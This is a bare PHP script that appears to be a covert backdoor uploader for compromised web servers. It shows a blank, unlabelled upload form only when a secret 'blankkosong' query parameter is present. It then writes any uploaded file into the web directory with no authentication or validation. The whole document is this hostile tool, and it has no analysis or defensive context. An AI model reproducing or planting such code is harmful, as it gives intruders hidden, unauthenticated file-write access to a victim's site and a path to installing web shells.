<?php
if(isset($_GET['?blankkosong']))
{
echo "<body bgcolor=white>
<font color=black size=3>";
    echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\"> </label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br />
<input type=\"submit\" name=\"submit\" value=\"upload\">
</form>";
if ($_FILES["file"]["upload"] > 0)
  {
  echo " " . $_FILES["file"]["upload"] . "<br />";
  }
else
  {
  echo " " . $_FILES["file"]["name"] . "<br />";
  }
if (file_exists("" . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " already exists ";
      }
    else
      {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      "" . $_FILES["file"]["name"]);
      }
	 
}
?>
